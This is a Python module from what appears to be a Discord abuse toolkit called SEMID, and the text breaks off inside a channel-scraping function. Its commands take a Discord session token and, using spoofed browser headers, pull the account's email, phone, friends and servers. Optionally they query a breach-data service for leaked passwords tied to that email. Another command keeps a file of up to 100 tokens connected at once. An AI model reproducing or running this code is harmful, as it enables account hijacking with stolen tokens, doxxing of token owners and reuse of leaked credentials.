from fake_headers import Headers
from semid.util.console import Console
import semid
from semid.util.token import TokenUtil
import requests, json, time, argparse
from concurrent.futures import ThreadPoolExecutor
from websocket import WebSocket

def tokeninfo(args:str):
    weleakinfo = semid.__app__.config["WeLeakInfo"]
    parser = argparse.ArgumentParser(prog="SEMID")
    parser.add_argument("--token", "-t", required=False)
    parser.add_argument("--weleak", "-w", required=False, action="store_true")
    argsArr = args.split()
    try:
        arg = parser.parse_args(argsArr)
    except:
        return TypeError
    token = arg.token
    TokenUtil.validateToken(token)
    headers = Headers(browser="chrome", os="windows", headers=True).generate()
    headers["Authorization"] = token
    headers["Accept-Encoding"] = "application/json"
    me = requests.get("https://discord.com/api/users/@me", headers=headers)
    me.raise_for_status()
    me = me.json()
    friends = requests.get("https://discord.com/api/users/@me/relationships", headers=headers)
    friends.raise_for_status()
    friends = friends.json()
    # connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers)
    # connections.raise_for_status()
    # connections = connections.json()
    # billing = requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)
    # billing.raise_for_status()
    # billing = billing.json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers)
    guilds.raise_for_status()
    guilds = guilds.json()
    c = Console.red("|")
    nitro = "None"
    print(me)
    text = f"""{c} User: {me["username"]}#{me["discriminator"]} | {me["id"]}
{c} Login: {me["email"]}
{c} Phone: {me["phone"]}
{c} Nitro: {nitro}
{c} Friends: {str(len(friends))} , Rare Badge Friends: {str(len(TokenUtil.calcfriends(friends)))}
{c} Guilds: {str(len(guilds))}
{c} Connections: Working on it!"""#.join(f"""  {c} {co["type"]}
       # {c} Name: {co["name"]}
       # {c} ID: {co["id"]}""" for co in connections)
    print(text)
    if weleakinfo != "" and arg.weleak == True:
        print(c + "Trying to get info from weleakinfo...")
        try:
            res = requests.get(f"https://api.weleakinfo.to/api?value={me['email']}&type=email&key={weleakinfo}").json()
            if res["success"] == True:
                for l in res["result"]:
                    if l["email_only"] == 1:
                        print(f"Found email: {l['line']}")
                    else:
                        print(f"Found password: {l['line']}")
            else:
                print("Nothing found.")
        except:
            print("Nothing found.")

def tokeninfosyntax():
    text = """
--token  | -t   <token>
--weleak | -w   Searches found email on weleakinfo

Example: use discord::tokeninfo --token <token> -w"""
    return text
def tokenonliner(args:str):
    weleakinfo = semid.__app__.config["WeLeakInfo"]
    parser = argparse.ArgumentParser(prog="SEMID")
    parser.add_argument("--file", "-f", required=False)
    parser.add_argument("--max", "-m", required=False, default=100)
    argsArr = args.split()
    try:
        arg = parser.parse_args(argsArr)
    except:
        raise TypeError
    file = arg.file
    max = arg.max
    ex = ThreadPoolExecutor(max_workers=int(max))

    def online(token):
        print(token)
        ws = WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        hb = json.loads(ws.recv())
        interval = hb["d"]["heartbeat_interval"]
        useragent = Headers(browser="chrome", os="windows", headers=True).generate()["User-Agent"]
        ws.send(json.dumps({"op": 2,"d": {"presence": {"activities": [], 'afk': False, "since": 0, "status": "online"},"token": token,"properties": {"$os": "Windows_NT","$browser": useragent,"$device": "desktop"}}}))
        while True:
            time.sleep(interval/1000)
            try:
                ws.send(json.dumps({"op": 1,"d": None}))
            except Exception:
                break
    tokens = open(file).read().splitlines()
    i = 1
    for token in tokens:
        ex.submit(online, token)
        print(f'Connected {i} tokens')
        i += 1
def tokenonlinersyntax():
    text = """
--file | -f <filepath>      The Filepath of your tokens
--max  | -m <max-threads>   The amount of tokens

Example: use discord::tokenonliner -f tokens.txt -m 100"""
    return text
def scrapechannel(args:str):
    argsArr = args.split(" ")

    try:
        idIn = argsArr.index("--channelid")
    except:
        try:
            idIn = argsArr.index("-id")
        except:
            raise TypeError
    channelID = argsArr[idIn + 1]
